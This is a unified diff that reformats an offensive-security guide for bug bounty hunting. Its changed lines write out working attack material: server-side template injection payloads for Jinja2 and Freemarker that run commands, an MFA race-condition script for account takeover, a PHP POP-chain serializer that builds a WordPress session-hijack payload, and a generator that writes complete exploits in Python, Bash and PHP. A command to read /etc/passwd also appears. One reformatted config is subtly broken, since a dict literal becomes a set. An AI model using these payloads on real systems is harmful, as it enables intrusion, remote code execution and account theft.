@@ -401,9 +401,9 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 
 **Jinja2 (Python/Flask/Django):**
 ```python
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
+{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
+{{"".__class__.__mro__[1].__subclasses__()[396]("id", shell=True, stdout=-1).communicate()[0].strip()}}
 ```
 
 **Twig (PHP/Symfony):**
@@ -627,17 +627,19 @@ for t_offset in range(-30, 31):  # Test ±30 seconds
 ```python
 import asyncio, aiohttp
 
+
 # Race 2 MFA verifications simultaneously
 # If both succeed = parallel session ATO
 async def verify(session, otp):
-    async with session.post("https://target.com/api/mfa/verify",
-                            json={"otp": otp}) as r:
+    async with session.post("https://target.com/api/mfa/verify", json={"otp": otp}) as r:
         return await r.json()
+
 
 async def race():
     async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
         results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
         print(results)
+
 
 asyncio.run(race())
 ```
@@ -890,6 +892,7 @@ def laravel_pop_rce(command):
     }}
 }}}}'''
 
+
 # Usage: laravel_pop_rce("cat /etc/passwd")
 ```
 
@@ -951,6 +954,7 @@ Generates PHP serialized objects with automatic exploit creation
 import base64
 import urllib.parse
 
+
 class POPChainGenerator:
     def __init__(self):
         self.chains = []
@@ -958,11 +962,11 @@ class POPChainGenerator:
     def serialize_object(self, class_name, properties, private=False):
         """Generate PHP serialized object"""
         payload = f'O:{len(class_name)}:"{class_name}":{len(properties)}:'
-        payload += '{'
+        payload += "{"
         for prop_name, prop_value in properties.items():
-            if private or prop_name.startswith('_'):
+            if private or prop_name.startswith("_"):
                 # Private/protected property encoding
-                if prop_name.startswith('_'):
+                if prop_name.startswith("_"):
                     prop_name = prop_name[1:]
                 encoded_name = f"\0{class_name}\0{prop_name}"
                 payload += f's:{len(encoded_name)}:"{encoded_name}";'
@@ -972,12 +976,12 @@ class POPChainGenerator:
             if isinstance(prop_value, str):
                 payload += f's:{len(prop_value)}:"{prop_value}";'
             elif isinstance(prop_value, int):
-                payload += f'i:{prop_value};'
+                payload += f"i:{prop_value};"
             elif isinstance(prop_value, list):
                 payload += self._serialize_array(prop_value)
             elif isinstance(prop_value, dict):
                 payload += self._serialize_array(prop_value)
-        payload += '}'
+        payload += "}"
         return payload
 
     def _serialize_array(self, arr):
@@ -987,37 +991,37 @@ class POPChainGenerator:
         items = []
         for key, value in arr.items():
             if isinstance(key, int):
-                items.append(f'i:{key};')
+                items.append(f"i:{key};")
             else:
                 items.append(f's:{len(key)}:"{key}";')
 
             if isinstance(value, str):
                 items.append(f's:{len(value)}:"{value}";')
             elif isinstance(value, int):
-                items.append(f'i:{value};')
-        return f'a:{len(arr)}:{{' + ''.join(items) + '}}'
+                items.append(f"i:{value};")
+        return f"a:{len(arr)}:{{" + "".join(items) + "}}"
 
-    def encode_for_transmission(self, payload, encoding='base64'):
+    def encode_for_transmission(self, payload, encoding="base64"):
         """Encode payload for HTTP transmission"""
-        if encoding == 'base64':
+        if encoding == "base64":
             return base64.b64encode(payload.encode()).decode()
-        elif encoding == 'url':
+        elif encoding == "url":
             return urllib.parse.quote(payload)
-        elif encoding == 'hex':
+        elif encoding == "hex":
             return payload.encode().hex()
         return payload
 
+
 # WordPress Session Hijack Example
 gen = POPChainGenerator()
-wp_payload = gen.serialize_object('WP_User_Meta_Session_Tokens', {
-    '_session': ['HACKED_TOKEN_1234567890ABCDEF'],
-    '_user_id': 1
-}, private=True)
+wp_payload = gen.serialize_object(
+    "WP_User_Meta_Session_Tokens", {"_session": ["HACKED_TOKEN_1234567890ABCDEF"], "_user_id": 1}, private=True
+)
 
 print("WordPress POP Chain:")
 print(wp_payload)
 print("\nBase64 encoded:")
-print(gen.encode_for_transmission(wp_payload, 'base64'))
+print(gen.encode_for_transmission(wp_payload, "base64"))
 ```
 
 ## POP Chain Exploit Auto-Generator
@@ -1031,6 +1035,7 @@ exploit code in multiple languages and save to poc/ directory.
 
 import os
 from pathlib import Path
+
 
 class POPExploitGenerator:
     """Generate complete exploit for discovered POP chain"""
@@ -1049,11 +1054,11 @@ class POPExploitGenerator:
         exploit = f'''#!/usr/bin/env python3
 """
 POP Chain Exploit for {self.target}
-Vulnerability: {self.vuln_info.get('description', 'Unserialize RCE')}
+Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}
 
 Author: Bug Bounty Researcher
-Date: {self.vuln_info.get('date', '2025-01-01')}
-CVSS: {self.vuln_info.get('cvss', '9.8 (Critical)')}
+Date: {self.vuln_info.get("date", "2025-01-01")}
+CVSS: {self.vuln_info.get("cvss", "9.8 (Critical)")}
 """
 
 import requests
@@ -1062,10 +1067,10 @@ import sys
 from urllib.parse import quote
 
 TARGET = "{self.target}"
-ENTRY_POINT = "{self.chain.get('entry_point', '/api/unserialize')}"
+ENTRY_POINT = "{self.chain.get("entry_point", "/api/unserialize")}"
 
 # POP Chain payload template
-PAYLOAD_TEMPLATE = """{self.chain.get('payload', 'O:1:"A":0:{}')}"""
+PAYLOAD_TEMPLATE = """{self.chain.get("payload", 'O:1:"A":0:{}')}"""
 
 def generate_payload(command="id"):
     """Generate POP chain payload with command"""
@@ -1132,10 +1137,10 @@ if __name__ == "__main__":
 
         exploit = f'''#!/bin/bash
 # POP Chain Exploit for {self.target}
-# Vulnerability: {self.vuln_info.get('description', 'Unserialize RCE')}
+# Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}
 
 TARGET="{self.target}"
-ENTRY_POINT="{self.chain.get('entry_point', '/api/unserialize')}"
+ENTRY_POINT="{self.chain.get("entry_point", "/api/unserialize")}"
 PAYLOAD='{self.chain.get("payload", "O:1:A:0:{}")}'
 
 # Colors
@@ -1190,11 +1195,11 @@ exploit "$@"
         exploit = f'''<?php
 /**
  * POP Chain Exploit for {self.target}
- * Vulnerability: {self.vuln_info.get('description', 'Unserialize RCE')}
+ * Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}
  */
 
 $TARGET = "{self.target}";
-$ENTRY_POINT = "{self.chain.get('entry_point', '/api/unserialize')}";
+$ENTRY_POINT = "{self.chain.get("entry_point", "/api/unserialize")}";
 
 /**
  * Generate POP chain payload
@@ -1262,27 +1267,28 @@ exploit($command);
         self.generate_php_exploit()
         print(f"[+] All exploits saved to {self.poc_dir}/")
 
+
 # Usage Example
 if __name__ == "__main__":
     # WordPress 6.4.3 Session Token Hijack
-    wordpress_config = {{
-        "target": "http://localhost:8080",
-        "name": "wordpress_session_hijack",
-        "description": "WordPress Unserialize RCE via WP_User_Meta_Session_Tokens",
-        "cvss": "9.8 (Critical)",
-        "date": "2025-01-22"
-    }}
+    wordpress_config = {
+        {
+            "target": "http://localhost:8080",
+            "name": "wordpress_session_hijack",
+            "description": "WordPress Unserialize RCE via WP_User_Meta_Session_Tokens",
+            "cvss": "9.8 (Critical)",
+            "date": "2025-01-22",
+        }
+    }
 
-    chain_config = {{
-        "entry_point": "/wp-admin/admin-ajax.php",
-        "payload": 'O:28:"WP_User_Meta_Session_Tokens":2:{{s:44:"\\0WP_User_Meta_Session_Tokens\\0session";a:1:{{i:0;s:32:"HACKED_TOKEN";}}}}s:44:"\\0WP_User_Meta_Session_Tokens\\0user_id";i:1;}}}}'
-    }}
+    chain_config = {
+        {
+            "entry_point": "/wp-admin/admin-ajax.php",
+            "payload": 'O:28:"WP_User_Meta_Session_Tokens":2:{{s:44:"\\0WP_User_Meta_Session_Tokens\\0session";a:1:{{i:0;s:32:"HACKED_TOKEN";}}}}s:44:"\\0WP_User_Meta_Session_Tokens\\0user_id";i:1;}}}}',
+        }
+    }
 
-    generator = POPExploitGenerator(
-        wordpress_config["target"],
-        wordpress_config,
-        chain_config
-    )
+    generator = POPExploitGenerator(wordpress_config["target"], wordpress_config, chain_config)
 
     # Generate all exploits
     generator.generate_all_exploits()
@@ -1453,7 +1459,7 @@ class ExploitWorkflow:
         """Generate exploit in all requested languages"""
 
         if self.vuln_type == "pop_chain":
-            generator = POPExploitGenerator(self.target, self.details, self.details['chain'])
+            generator = POPExploitGenerator(self.target, self.details, self.details["chain"])
             generator.generate_all_exploits()
 
         elif self.vuln_type == "sqli":
